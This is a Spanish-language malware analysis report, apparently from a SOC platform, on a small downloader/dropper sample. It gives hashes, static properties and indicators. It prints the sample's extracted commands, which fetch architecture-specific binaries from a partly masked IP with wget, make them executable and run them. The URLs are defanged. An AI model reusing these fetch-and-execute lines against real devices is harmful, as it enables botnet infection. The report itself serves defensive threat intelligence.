# 🧬 Payload Analysis

`07e121e2b542e5b596837d85d936bb31a8a9f09df2a3fb10ebe3bd23bf5bc6c1`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se asociaron 6 comandos observados o extraídos.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:01:51+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `07e121e2b542e5b596837d85d936bb31a8a9f09df2a3fb10ebe3bd23bf5bc6c1`
- **SHA1:** `06d1c908e4a2ebdc8de52d0a2f71a4e6cdb2933f`
- **MD5:** `429f65682be7345599b9c816128fe1f5`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 1.2 KiB |
| Entropía | 5.24 |
| Strings | 25 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=10

## 🖥️ Comandos observados / extraídos

```text
rm arm5; wget hxxp://31.56.209.XXX/arm5; chmod 777 arm5;./arm5 telnet;
rm arm7; wget hxxp://31.56.209.XXX/arm7; chmod 777 arm7;./arm7 telnet;
rm mips; wget hxxp://31.56.209.XXX/mips; chmod 777 mips;./mips telnet;
rm mpsl; wget hxxp://31.56.209.XXX/mpsl; chmod 777 mpsl;./mpsl telnet;
rm x86; wget hxxp://31.56.209.XXX/x86; chmod 777 x86;./x86 telnet;
rm x86; wget hxxp://31.56.209.XXX/x86; chmod 777 x86;./x86 telnet;HTTP/1.1 200 OK
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 31.56.209.XXX | static_analysis |
| url | hxxp://31.56.209.XXX/arm5; | strings |
| url | hxxp://31.56.209.XXX/arm7; | strings |
| url | hxxp://31.56.209.XXX/mips; | strings |
| url | hxxp://31.56.209.XXX/mpsl; | strings |
| url | hxxp://31.56.209.XXX/x86; | strings |
| hash | 07e121e2b542e5b596837d85d936bb31a8a9f09df2a3fb10ebe3bd23bf5bc6c1 | static_analysis |
| command | rm arm5; wget hxxp://31.56.209.XXX/arm5; chmod 777 arm5;./arm5 telnet; | strings |
| command | rm arm7; wget hxxp://31.56.209.XXX/arm7; chmod 777 arm7;./arm7 telnet; | strings |
| command | rm mips; wget hxxp://31.56.209.XXX/mips; chmod 777 mips;./mips telnet; | strings |
| command | rm mpsl; wget hxxp://31.56.209.XXX/mpsl; chmod 777 mpsl;./mpsl telnet; | strings |
| command | rm x86; wget hxxp://31.56.209.XXX/x86; chmod 777 x86;./x86 telnet; | strings |
| command | rm x86; wget hxxp://31.56.209.XXX/x86; chmod 777 x86;./x86 telnet;HTTP/1.1 200 OK | strings |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | html response |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
